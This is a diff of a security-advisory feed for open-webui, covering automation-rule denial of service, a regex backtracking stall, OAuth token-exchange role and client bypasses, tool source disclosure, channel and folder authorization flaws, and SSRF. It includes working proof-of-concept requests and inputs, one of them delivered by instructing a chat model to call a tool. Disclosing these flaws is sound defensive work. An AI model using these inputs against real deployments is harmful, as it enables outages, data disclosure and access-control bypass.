+## Proof of concept&#13;
+A single next-occurrence computation on the released code path, one call each, measured on 0.11.0 with the sub-daily fix in place:&#13;
+&#13;
+| rule | cost |&#13;
+|---|---|&#13;
+| `RRULE:FREQ=MINUTELY;BYMONTH=2;BYMONTHDAY=30` | 3.85 s |&#13;
+| `RRULE:FREQ=SECONDLY;BYMONTH=2;BYMONTHDAY=30` | 5.73 s |&#13;
+| `RRULE:FREQ=HOURLY;BYMONTH=2;BYMONTHDAY=30` | 4.39 s |&#13;
+| `RRULE:FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30` | 1.81 s |&#13;
+| `RRULE:FREQ=MINUTELY;BYMONTH=2;BYMONTHDAY=30;BYSECOND=0,1,...,59` | 31.45 s |&#13;
+&#13;
+A variant combining full `BYMINUTE` and `BYSECOND` lists at hourly frequency did not return within 10 minutes.&#13;
+&#13;
+Reaching this over HTTP requires nothing beyond the rule itself:&#13;
+&#13;
+```bash&#13;
+curl -X POST $BASE/api/v1/automations/create -H "Authorization: Bearer $ATK" \&#13;
+  -H 'Content-Type: application/json' \&#13;
+  -d '{"name":"x","data":{"rrule":"RRULE:FREQ=MINUTELY;BYMONTH=2;BYMONTHDAY=30;BYSECOND=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59","prompt":"x"}}'&#13;
+```&#13;
+&#13;
+The measurements were taken at function level against the released validator, with a concurrent task on the same event loop recording how long it was starved. On 0.9.0, 0.10.2 and 0.11.3 the February 30th minutely rule blocked the event loop for 3.6 to 4.0 seconds per call. On 0.11.4 the same rule, and the full `BYSECOND` variant, are rejected after two seconds, and the event loop is never blocked for longer than its normal scheduling interval. Both automation routes call the validator directly inside their async handlers, so a request to either one blocks the instance for the same duration.&#13;
+&#13;
+## Credits&#13;
+@Classic298</description>
+      <guid isPermaLink="false">GHSA-5w58-mwmh-vf2m</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 16:31:36 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Revoked users keep signing in via token exchange when roles are only in the ID token</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-2rr4-q6pg-m5g3</link>
+      <description>CVSS 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) · CWE-863
+
+Affected:
+- pip/open-webui &gt;= 0.11.1, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Revoked users keep signing in via token exchange when roles are only in the ID token&#13;
+&#13;
+## Summary&#13;
+The OAuth token exchange endpoint lets a user who already has a linked OAuth account swap a provider access token for an Open WebUI session. Since 0.11.1 it applies the OAuth role policy, but it only reads roles from the provider's userinfo response, and it only refuses a user when a roles claim is found. With an identity provider that sends roles only in the ID token (Microsoft Entra ID app roles are the common case), token exchange sees no roles and keeps the user's existing role, so a user whose provider role no longer satisfies the policy, and who is correctly refused at browser login, can still get a working session.&#13;
+&#13;
+## Preconditions&#13;
+- `ENABLE_OAUTH_TOKEN_EXCHANGE=true` (default `false`).&#13;
+- `ENABLE_OAUTH_ROLE_MANAGEMENT=true` (default `false`), with `OAUTH_ALLOWED_ROLES` (default `user,admin`) not containing `*`.&#13;
+- The identity provider puts the roles claim only in the ID token and not in the userinfo response.&#13;
+- The attacker already has an Open WebUI account linked to their provider identity, and can still obtain a valid access token from the provider (their provider account is active, only their role changed).&#13;
+&#13;
+Deployments with either setting off, or whose provider returns roles in userinfo, are not affected.&#13;
+&#13;
+## Impact&#13;
+A user the operator meant to lock out through the OAuth role policy keeps signing in through token exchange and keeps the role they held before, together with everything that role can reach. The attacker gains nothing beyond their previous access: an empty roles claim can neither grant admin nor change the role. Exploitation needs the non-default configuration above and a previously provisioned account. Browser SSO login is not affected and refuses the user as intended.&#13;
+&#13;
+## Fix&#13;
+Fixed in 10d1cfe63, released in 0.11.4. Token exchange now also reads the roles claim from the exchanged token, and when role management is on and no roles claim can be read at all, it refuses the exchange.&#13;
+&#13;
+## Root cause&#13;
+- Component: the OAuth token exchange endpoint (`POST /api/v1/auths/oauth/{provider}/token/exchange`) and the OAuth role policy it calls.&#13;
+- Affected builds: 0.11.1 through 0.11.3, the releases that added the role policy to token exchange.&#13;
+&#13;
+The role policy was written for browser login, where the ID token claims are merged into the user data before the policy runs, so "no roles claim" there means the provider genuinely sent none and keeping the current role is the documented behaviour. Token exchange never receives an ID token and builds the user data from userinfo alone, so for providers that only put roles in the ID token the policy always saw an empty claim and fell through to keeping the existing role instead of refusing.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced on the 0.11.3 and 0.11.4 PyPI packages with a local OIDC provider that puts `roles` only in the ID token, `ENABLE_OAUTH_TOKEN_EXCHANGE=true`, `ENABLE_OAUTH_ROLE_MANAGEMENT=true` and an `OAUTH_ALLOWED_ROLES` list.&#13;
+&#13;
+1. Sign in once through SSO while holding an allowed role, so the account is linked.&#13;
+2. At the provider, change the user's role to one outside the allowed list.&#13;
+3. Browser SSO login: refused with 403 on both versions.&#13;
+4. Obtain an access token from the provider and send `POST /api/v1/auths/oauth/{provider}/token/exchange` with `{"token": "&lt;access token&gt;"}`.&#13;
+5. On 0.11.3 the request returns 200 with a session token that works on `GET /api/v1/auths/`. On 0.11.4 it returns 403.&#13;
+&#13;
+Control: a user still holding an allowed role is allowed on both versions.&#13;
+&#13;
+## Credits&#13;
+- `manus-pi`: reported the role policy bypass on token exchange for providers that send roles only in the ID token.</description>
+      <guid isPermaLink="false">GHSA-2rr4-q6pg-m5g3</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 16:14:42 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Tool source code disclosed to read-only users via the tool export endpoint</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-2h26-836q-4jh2</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) · CWE-200
+
+Affected:
+- pip/open-webui &gt;= 0.6.37, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Tool source code disclosed to read-only users via the tool export endpoint&#13;
+&#13;
+## Summary&#13;
+A user allowed to export tools received the full Python source of every tool that had merely been shared with them for reading. Since 0.11.0 tool source is writer-only: a read-only recipient can use a shared tool, and the tool's detail view withholds its source from them. The bulk export returned it anyway, because it selected every tool the caller could read.&#13;
+&#13;
+## Preconditions&#13;
+- Authentication enabled (`WEBUI_AUTH=true`, default) and plugins enabled (`ENABLE_PLUGINS=true`, default).&#13;
+- The attacker is an authenticated non-admin who holds the tool export permission (`workspace.tools_export`, off by default, set with `USER_PERMISSIONS_WORKSPACE_TOOLS_EXPORT` or granted by an admin in default or group permissions).&#13;
+- A tool owned by someone else is shared with a read grant to the attacker, to one of their groups, or to all users.&#13;
+&#13;
+Deployments that never grant the tool export permission to non-admins, or that share tools only with users who already hold write access, are not affected.&#13;
+&#13;
+## Impact&#13;
+A non-admin with export rights obtains the server-side source of every tool shared with them read-only, in one request. Tool source commonly embeds API keys, credentials and internal service URLs, so the loss often reaches beyond the code itself. Confidentiality only: the export grants no ability to modify or run tools, and has no integrity or availability impact.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by #29310. The export now returns only tools the caller owns or holds write access to, the same scope the per-tool export and the model export already used. Upgrading fully resolves the issue with no configuration change.&#13;
+&#13;
+## Root cause&#13;
+Affected component: `GET /api/v1/tools/export` in `backend/open_webui/routers/tools.py`. Every release since 0.6.37, when tool export was opened to non-admins, carries it.&#13;
+&#13;
+The export response deliberately includes each tool's source, since exporting is how a writer takes a copy of their tools. The handler, however, built its list with the default read scope of the tool query, so every tool shared read-only with the caller was exported with its source. When 0.11.0 made source writer-only on the detail endpoint, the export path was left on the read scope and kept returning it.&#13;
+&#13;
+## Proof of concept&#13;
+Against a fresh instance, with an admin and a second account `bob` of role `user`:&#13;
+&#13;
+1. As the admin, enable tool export for users (`POST /api/v1/users/default/permissions` with `workspace.tools_export: true`).&#13;
+2. As the admin, create a tool whose source contains a marker and share it read-only with bob:&#13;
+&#13;
+```&#13;
+POST /api/v1/tools/create&#13;
+{"id": "readtool", "name": "Read Tool",&#13;
+ "content": "API_KEY = \"TOOL_SRC_SECRET\"\nclass Tools:\n    def hello(self) -&gt; str:\n        return 'hi'\n",&#13;
+ "meta": {"description": "poc"},&#13;
+ "access_grants": [{"principal_type": "user", "principal_id": "&lt;bob id&gt;", "permission": "read"}]}&#13;
+```&#13;
+&#13;
+3. As bob:&#13;
+&#13;
+```&#13;
+GET /api/v1/tools/id/readtool  -&gt; 200, no content field&#13;
+GET /api/v1/tools/export       -&gt; 200, [{"id": "readtool", "content": "API_KEY = \"TOOL_SRC_SECRET\" ...", ...}]&#13;
+```&#13;
+&#13;
+On 0.11.4 the same export returns only tools bob owns or can write, and `readtool` is absent, while the admin still exports it.&#13;
+&#13;
+## Credits&#13;
+- gigioneggiando: reported the source disclosure through the tool export endpoint.</description>
+      <guid isPermaLink="false">GHSA-2h26-836q-4jh2</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 15:58:57 +0000</pubDate>
+    </item>
     <item>
       <title>[CRITICAL] WordPress/wordpress-develop — Unauthenticated path traversal in page-template resolution leading to conditional RCE (CVE-2026-87902)</title>
       <link>https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp</link>
@@ -3023,746 +3936,6 @@ Reported by @manus-use (researcher zx / Jace).</description>
       <category>HIGH</category>
       <category>open-webui/open-webui</category>
       <pubDate>Sun, 02 Aug 2026 22:30:32 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can stall a worker via a knowledge-search pattern that backtracks catastrophically (CVE-2026-70493)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-2f54-p244-32q6</link>
-      <description>CVE-2026-70493 · CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-1333
-
-Affected:
-- pip/open-webui &gt;= 0.9.6, &lt; 0.11.0 (patched: 0.11.0)
-
----
-
-# Any authenticated user can stall a worker via a knowledge-search pattern that backtracks catastrophically&#13;
-&#13;
-## Summary&#13;
-The built-in knowledge search tools let a chat participant choose the pattern used to grep knowledge files. Patterns containing regex metacharacters were compiled with Python's backtracking `re` engine and run against every line of every reachable file, with no time limit anywhere on that path. A single crafted pattern and a single short line of matching text pin one CPU core for as long as the attacker wants, and because the search runs synchronously inside the event loop, that worker serves nobody else while it spins.&#13;
-&#13;
-## Preconditions&#13;
-- Default configuration. The knowledge builtin tool group is enabled by default, and with `ENABLE_KB_EXEC` at its default of `False` the model is handed `grep_knowledge_files`, which is the affected path.&#13;
-- Any authenticated user, no elevated role and no workspace permission.&#13;
-- One file the attacker can read. `USER_PERMISSIONS_CHAT_FILE_UPLOAD` defaults to true and a user always has read access to their own upload, so both halves of the input are attacker-supplied.&#13;
-- A model willing to call the tool with the attacker's literal pattern. This is the one non-deterministic step: it is reliable in practice by instructing the model in your own chat, but it is not guaranteed on a given turn.&#13;
-- Deployments running with `UVICORN_WORKERS` at its default of 1 lose the whole instance; multi-worker deployments lose one worker per request.&#13;
-&#13;
-## Impact&#13;
-Availability, against every other user of the affected worker. Cost scales exponentially with the length of the matching text: measured on the vulnerable code, a 24 character subject takes 1.2s, 28 takes 19s and 30 takes 74s, and a 40 character subject extrapolates to roughly a day of CPU. The same subject against a literal pattern takes under a microsecond. There is no confidentiality or integrity effect, and no data is read or altered.&#13;
-&#13;
-## Fix&#13;
-Fixed in 0.11.0 by https://github.com/open-webui/open-webui/pull/27471. Pattern matching moved from `re` to the `regex` engine, which supports a per-search timeout, and every tool call now runs its searches under a single 2 second matching budget, after which the tool returns an error instead of continuing to match. Upgrading is sufficient; there is nothing an operator has to configure.&#13;
-&#13;
-## Root cause&#13;
-- `backend/open_webui/tools/knowledge_fs.py`, `build_matcher`: compiled the caller's pattern and returned an unbounded match function.&#13;
-- `backend/open_webui/tools/builtin.py`, `grep_knowledge_files`: the default-configuration caller, which ran that matcher over every line of every reachable file.&#13;
-&#13;
-`build_matcher` treated any pattern containing regex metacharacters as a regex, so no explicit flag was needed to reach the compiler. From there the only limits in place were on results, not on work: a cap on matches returned and a cap on files scanned, neither of which bounds the time a single line can consume. Backtracking cost is exponential in the length of the matched text rather than in the pattern, so capping pattern length or line length would not have bounded it either. The engine had no timeout available and none was imposed elsewhere.&#13;
-&#13;
-## Proof of concept&#13;
-Against a real instance as an ordinary user:&#13;
-&#13;
-1. Upload a text file whose content is a single line of 30 `x` characters, and no `y`.&#13;
-2. In a chat on a model with the knowledge tools available, instruct the model to call `grep_knowledge_files` with the pattern `(x|x)*y` and that file's id.&#13;
-3. The request never returns. The worker's CPU sits at 100% for the duration, and concurrent requests from other users on the same worker do not complete.&#13;
-&#13;
-Growth measured directly against `build_matcher` on the vulnerable code:&#13;
-&#13;
-| subject length | time  |&#13;
-| -------------- | ----- |&#13;
-| 16             | 4.7ms |&#13;
-| 20             | 73ms  |&#13;
-| 24             | 1.21s |&#13;
-| 28             | 19.3s |&#13;
-| 30             | 73.9s |&#13;
-&#13;
-## Credits&#13;
-@Classic298, for the finding and the fix.</description>
-      <guid isPermaLink="false">GHSA-2f54-p244-32q6</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:28:14 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Instance-wide stall via automation recurrence rules that force multi-second parsing (CVE-2026-70489)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-73cq-mcgh-379c</link>
-      <description>CVE-2026-70489 · CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-1333
-
-Affected:
-- pip/open-webui &gt;= 0.9.0, &lt; 0.11.0 (patched: 0.11.0)
-
----
-
-# Instance-wide stall via automation recurrence rules that force multi-second parsing&#13;
-&#13;
-## Summary&#13;
-In every affected release, automation recurrence parsing anchors minutely and hourly rules at a fixed date of 2000-01-01 and then walks forward one interval at a time to find the next run. A single `FREQ=MINUTELY` rule therefore enumerates roughly a quarter-century of occurrences, synchronously, on the event loop that also serves the scheduler, HTTP and WebSocket traffic. Nothing bounds the walk, and nothing moves it off the loop.&#13;
-&#13;
-## Preconditions&#13;
-Any user who can create an automation. `USER_PERMISSIONS_FEATURES_AUTOMATIONS` defaults to `false`, so on a default deployment only an admin can reach the create path; it becomes reachable by ordinary users on any deployment that has granted the automations feature, which is the normal way to make the feature usable. `UVICORN_WORKERS` defaults to 1, so there is no second worker to absorb the stall. The rule needs no unusual syntax: `FREQ=MINUTELY` with no `DTSTART`, or with a `DTSTART` set well in the past, is enough.&#13;
-&#13;
-## Impact&#13;
-Availability, against every other user of the instance. One evaluation of `RRULE:FREQ=MINUTELY` takes 18.9 s of blocking CPU; adding a ten-value `BYSECOND` list multiplies the walk and takes 64.2 s. `FREQ=HOURLY` costs 0.34 s and is not materially exploitable on its own. The cost does not stop at creation: once the automation is stored, the scheduler recomputes the next run for every claimed row on each poll, so the same walk repeats on a default 10 s interval and the instance stays wedged rather than recovering. Instances that have not enabled the automations feature for non-admin users are exposed only to an admin doing this.&#13;
-&#13;
-## Fix&#13;
-Fixed in 0.11.0. Sub-daily rules are now anchored to the current clock instead of the year-2000 date, so the walk starts at the next occurrence rather than a quarter-century behind it. A caller-supplied `DTSTART` is honoured only when the number of occurrences it implies stays under a fixed bound, and is otherwise replaced by the clock-aligned anchor. The same rules that cost 18.9 s and 64.2 s now cost under a millisecond. Upgrading fully resolves the issue, no configuration change is required.&#13;
-&#13;
-## Root cause&#13;
-Affected component: `backend/open_webui/utils/automations.py`, `_parse_rule`, reached from the automation create, update and toggle handlers in `backend/open_webui/routers/automations.py` and from the scheduler's claim path in `backend/open_webui/models/automations.py`. Affected setup: every build from 0.9.0 onward, since that is when the automations feature shipped.&#13;
-&#13;
-The fixed anchor existed to make sub-daily intervals snap to clock boundaries, so that "every 5 minutes" lands on :00, :05, :10 rather than drifting from whenever the automation happened to be created. Snapping only needs a reference point of the right phase, but the implementation used a literal far-past date as that reference and left the recurrence library to walk forward from it. The distance between the anchor and the present is therefore attacker-influenced work that grows with real time, and it was never treated as a cost that needed a bound or a thread.&#13;
-&#13;
-## Proof of concept&#13;
-Measured cost of a single next-run computation against the shipped 0.10.2 parser:&#13;
-&#13;
-| rule | cost |&#13;
-| --- | --- |&#13;
-| `RRULE:FREQ=MINUTELY` | 18,880 ms |&#13;
-| `RRULE:FREQ=MINUTELY;BYSECOND=0,1,2,3,4,5,6,7,8,9` | 64,236 ms |&#13;
-| `DTSTART:20000101T000000` + `RRULE:FREQ=MINUTELY` | 26,237 ms |&#13;
-| `RRULE:FREQ=HOURLY` | 339 ms |&#13;
-&#13;
-Measured at function level deliberately. Persisting such an automation has the scheduler repeat the walk on every poll and wedge the instance indefinitely, which is the actual impact but makes a live end-to-end run destructive to the test instance.&#13;
-&#13;
-## Credits&#13;
-Reported by @Classic298.</description>
-      <guid isPermaLink="false">GHSA-73cq-mcgh-379c</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:08:09 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Any member with write access to a standard channel can edit or delete other members' messages (CVE-2026-70481)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-mj5r-jf49-m3w7</link>
-      <description>CVE-2026-70481 · CVSS 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L) · CWE-284, CWE-862
-
-Affected:
-- pip/open-webui &gt;= 0.5.0, &lt;= 0.10.2 (patched: &gt;= 0.11.0)
-
----
-
-# Any member with write access to a standard channel can edit or delete other members' messages&#13;
-&#13;
-## Summary&#13;
-On standard channels, the message update and delete handlers accepted any caller holding write access on the channel, without checking that the caller wrote the message. Write access is the same grant a member needs in order to post, so every ordinary participant in a shared channel could rewrite or permanently delete any other participant's messages. The group and direct message branch of the same handlers enforced authorship; the standard branch did not.&#13;
-&#13;
-## Preconditions&#13;
-Channels are disabled by default and must be enabled by an administrator (`ENABLE_CHANNELS`). The channel must be a standard channel; group and direct message channels are not affected. The attacker is any authenticated account with role `user` that holds write access on the channel, whether granted publicly, per user, or through a group. No ownership of the channel, channel manager role, or elevated role is required. Channel and message ids are returned by the listing endpoints the member can already call.&#13;
-&#13;
-## Impact&#13;
-An ordinary member could replace the content of another member's message while the message stayed attributed to its original author, and could attach arbitrary `data` and `meta` payloads to it through the same form. The member could also permanently delete other members' messages, up to the entire visible history of the channel. This is an integrity and availability loss against other users of the channel: content can be forged under a colleague's name and records can be destroyed. It reaches no further than channels the attacker already has write access to, and it discloses nothing the attacker could not already read as a member. Pinning is unaffected and is not part of this issue.&#13;
-&#13;
-## Fix&#13;
-Fixed in `c609ec411` (#27197), released in 0.11.0. Both handlers now apply the same authorship check the group and direct message branch already used, so a non-admin caller can act only on their own messages regardless of write access. Upgrading fully resolves it, with no configuration change required.&#13;
-&#13;
-## Root cause&#13;
-Affected components:&#13;
-- `backend/open_webui/routers/channels.py`, `update_message_by_id` (`POST /api/v1/channels/{id}/messages/{message_id}/update`)&#13;
-- `backend/open_webui/routers/channels.py`, `delete_message_by_id` (`DELETE /api/v1/channels/{id}/messages/{message_id}/delete`)&#13;
-&#13;
-Both handlers branch on channel type, and the two branches asked different questions. The group and direct message branch asked whether the caller wrote the message. The standard branch asked whether the caller is allowed to write in the channel, which is a permission level, not an identity. Those are not interchangeable: posting a message runs that same write check, so the grant that lets a member participate was silently accepted as the grant to rewrite and remove everyone else's content, and every ordinary participant satisfied it. The model layer looks messages up by primary key alone, so the router branch was the only authorization that ran.&#13;
-&#13;
-## Proof of concept&#13;
-Reported with a script that runs end to end against a live instance. An administrator seeds the accounts and a standard channel granting read and write; everything after that is performed by a separate plain `user` account in no group that owns neither the channel nor any of the messages. That account edits a victim's message, attaches structured payloads to it, and deletes a second victim message, all returning 200, with the channel history dumped before and after. Controls in the same run confirm the scoping: a read-only member is refused with 403, and a cross-member edit on a group channel is refused with 403.&#13;
-&#13;
-## Credits&#13;
-@Foxer131 — reported the missing authorship check on the standard-channel update and delete handlers.</description>
-      <guid isPermaLink="false">GHSA-mj5r-jf49-m3w7</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 21:40:08 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui — SSRF into internal services via unvalidated sub-resource requests in the Playwright web loader (CVE-2026-70479)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-w2rx-84hp-gg95</link>
-      <description>CVE-2026-70479 · CVSS 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) · CWE-918
-
-Affected:
-- pip/open-webui &gt;= 0.9.6, &lt; 0.11.0 (patched: &gt;= 0.11.0)
-
----
-
-# SSRF into internal services via unvalidated sub-resource requests in the Playwright web loader&#13;
-&#13;
-## Summary&#13;
-With the Playwright web loader enabled, Open WebUI opens user-submitted URLs in a real browser and validates the destination address before allowing the request. That check only ran for the top-level page request. Every other request the page issued was passed through unvalidated, so a page could use its own JavaScript to reach addresses the validation exists to block. Because the loader returns the page's final DOM to the requesting user, anything the page read back from those addresses ends up in the web-search or RAG output.&#13;
-&#13;
-## Preconditions&#13;
-- `WEB_LOADER_ENGINE=playwright`. This is not the default; deployments on the default web loader are unaffected.&#13;
-- A reachable Playwright browser, either local or via `PLAYWRIGHT_WS_URL`.&#13;
-- Any authenticated user who can submit a URL for ingestion or trigger a web search. No administrator role is required.&#13;
-- Something worth reading on a network the browser can reach. A deployment whose browser container has no route to internal services loses nothing here.&#13;
-&#13;
-## Impact&#13;
-An authenticated user can read HTTP responses from services reachable by the browser process: cloud instance metadata, other containers on the same network, and internal APIs bound to private addresses. The content is returned to the user through the normal web-search or document-ingestion result, so this is a read primitive, not a blind one. It confers no write access and no availability impact, and it does not extend beyond what the browser's network position already allows.&#13;
-&#13;
-## Fix&#13;
-Fixed in 0.11.0 by commit `bef63a2ae`. Every intercepted request is now validated, fetched with redirects disabled, re-validated on each redirect hop and then fulfilled, so neither a sub-resource nor a redirect can land on a non-global address. The same change blocks the two paths that never reached the interceptor at all: service-worker requests, via `service_workers="block"`, and WebSocket connections, via a route handler that never connects upstream. Upgrading to 0.11.0 fully resolves the issue; no configuration change is required.&#13;
-&#13;
-## Root cause&#13;
-Affected component: `SafePlaywrightURLLoader` in `backend/open_webui/retrieval/web/utils.py`, in both the sync and async request interceptors. Affected setup: only builds running the Playwright loader engine.&#13;
-&#13;
-The interceptor was written to guard navigation, and its first action was to return early for any request whose resource type was not `document`. The intent was that only the page the user asked for needs address validation, but a browser page is not a single request: once the validated document loads, its scripts issue further requests under the page's own control, and those never reached the validation. The address check was therefore applied to the one request the attacker did not need to control, and skipped on every request they did.&#13;
-&#13;
-## Proof of concept&#13;
-Reported against 0.10.2 by driving the interceptor directly with stand-in route and request objects, one call per resource type, against `http://169.254.169.254/latest/meta-data/`. The `document` type is aborted; every other type is continued unvalidated. The browser and the network request were seeded rather than driven end to end; the code path exercised is the one the browser reaches for each sub-resource.&#13;
-&#13;
-## Credits&#13;
-- **@edwardav970** — identified that address validation was applied only to the top-level document request, leaving every sub-resource type unvalidated.</description>
-      <guid isPermaLink="false">GHSA-w2rx-84hp-gg95</guid>
-      <category>HIGH</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 21:36:36 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui — A folder write-collaborator can permanently delete the owner's chats by deleting a shared subfolder (CVE-2026-70494)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3cg5-48j3-v4gv</link>
-      <description>CVE-2026-70494 · CVSS 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H) · CWE-862, CWE-863
-
-Affected:
-- pip/open-webui &gt;= 0.10.0, &lt; 0.11.0 (patched: 0.11.0)
-
----
-
-# A folder write-collaborator can permanently delete the owner's chats by deleting a shared subfolder&#13;
-&#13;
-## Summary&#13;
-A user granted write access to a shared chat folder could permanently delete chats and messages belonging to the folder's owner. Deleting a folder cascades into the owner's chats and the entire subfolder subtree, and the deletion handler required only write access on subfolders instead of ownership. Root folders were restricted to the owner or an admin, subfolders were not.&#13;
-&#13;
-## Preconditions&#13;
-The Folders Sharing permission (`user.permissions.sharing.folders`) must be enabled; it is off by default. The victim must have shared a folder with the attacker at write access. `features.folders` and the `chat.delete` permission are enabled by default and are both required. Deployments that leave folder sharing disabled are not affected, and neither are single-user instances.&#13;
-&#13;
-## Impact&#13;
-Permanent, irreversible destruction of another user's chat history within and beneath a shared folder. With `delete_contents=false` the same request instead force-moved the owner's chats out of the folder, an unauthorized relocation rather than a deletion. The write grant on the shared root folder is inherited by every descendant, so the attacker could destroy subfolders that were never explicitly shared with them. Nothing outside the shared folder's subtree is reachable, and no data is disclosed that write access did not already expose.&#13;
-&#13;
-## Fix&#13;
-Fixed in 0.11.0 by https://github.com/open-webui/open-webui/pull/27003. Folder deletion is now restricted to the folder owner or an admin for root folders and subfolders alike, replacing the previous root/subfolder split with a single check. Upgrading fully resolves the issue; no configuration change is required. Owners and admins are unaffected, and a write-collaborator can still create, rename and add to shared folders and delete subfolders they own.&#13;
-&#13;
-## Root cause&#13;
-Affected component: `backend/open_webui/routers/folders.py`, the `DELETE /api/v1/folders/{id}` handler. Affected setup: any release from 0.10.0 onward that has folder sharing enabled.&#13;
-&#13;
-The cascade that follows the authorization check is bound to the folder owner's id, not the caller's, so whoever passes the check deletes the owner's data. The check itself branched on whether the folder had a parent: root folders demanded ownership or admin, while subfolders accepted any write grant. Because write grants propagate down the folder tree, that branch handed every collaborator deletion rights over the owner's subtree, which is broader than what the sharing model grants write access.&#13;
-&#13;
-## Credits&#13;
-@legobattman, who reported the issue and its remediation.</description>
-      <guid isPermaLink="false">GHSA-3cg5-48j3-v4gv</guid>
-      <category>HIGH</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 21:21:29 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui — Account takeover via OAuth token exchange accepting tokens issued to any client (CVE-2026-70482)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-rq84-p6rr-vf89</link>
-      <description>CVE-2026-70482 · CVSS 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) · CWE-287
-
-Affected:
-- pip/open-webui &gt;= 0.8.0, &lt; 0.11.0 (patched: 0.11.0)
-
----
-
-# Account takeover via OAuth token exchange accepting tokens issued to any client&#13;
-&#13;
-## Summary&#13;
-&#13;
-The OAuth token exchange endpoint accepts a raw provider access token and validates it by calling the provider's userinfo endpoint. A userinfo endpoint reports only that a token is valid, never which OAuth client it was issued to, and the endpoint performed no audience or client check of its own. Anyone holding an access token minted for any client registered with the same provider could exchange it for an Open WebUI session as that token's user, including applications the operator does not control and has never authorised.&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- `ENABLE_OAUTH_TOKEN_EXCHANGE=True`. Disabled by default, so a stock deployment is not affected.&#13;
-- The victim already has an Open WebUI account. The endpoint does not create users.&#13;
-- The attacker can obtain a provider access token for the victim, typically by having them sign in to an unrelated OAuth application on the same provider. On public providers, registering that application is self-service.&#13;
-- The subject identifier the attacker's client observes matches the one stored on the victim's account. Google, GitHub, Okta and self-hosted OIDC servers in default configuration issue a subject that is stable across all clients and are directly affected. Microsoft Entra ID issues per-application subjects, so the match fails there unless `OAUTH_MERGE_ACCOUNTS_BY_EMAIL` is enabled or `OAUTH_SUB_CLAIM` points at a globally stable claim such as `oid`.&#13;
-- `OAUTH_ALLOWED_DOMAINS` is enforced on this endpoint but does not constrain the attack, because the impersonated user is a legitimate member of an allowed domain.&#13;
-&#13;
-## Impact&#13;
-&#13;
-Full account takeover of any user whose provider access token the attacker can obtain. The endpoint applies no role gating, so the issued session carries the target account's role, and a targeted administrator yields an administrator session. The victim never interacts with Open WebUI and has no opportunity to notice.&#13;
-&#13;
-The standard OAuth callback is not affected. It obtains its token through an authorization-code exchange authenticated with the client secret, so the token is inherently bound to Open WebUI's own client, and the ID token's audience is validated.&#13;
-&#13;
-## Fix&#13;
-&#13;
-Fixed in 0.11.0. The endpoint now resolves which OAuth client a presented token was issued to through RFC 7662 token introspection, and rejects tokens minted for any client not named in `OAUTH_TOKEN_EXCHANGE_TRUSTED_CLIENT_IDS`. Only the introspected `client_id` is honoured; the `aud` field is ignored, because it names intended resource servers rather than the issuing client and several providers let any client place another client's identifier there.&#13;
-&#13;
-**Upgrading alone is not sufficient.** The check is opt-in: with `OAUTH_TOKEN_EXCHANGE_TRUSTED_CLIENT_IDS` unset the endpoint behaves as it did before, so any deployment running with `ENABLE_OAUTH_TOKEN_EXCHANGE=True` must also set that list. It is a deploy-time environment variable and cannot be changed from the admin interface, so a compromised administrator session cannot widen the trust boundary at runtime.&#13;
-&#13;
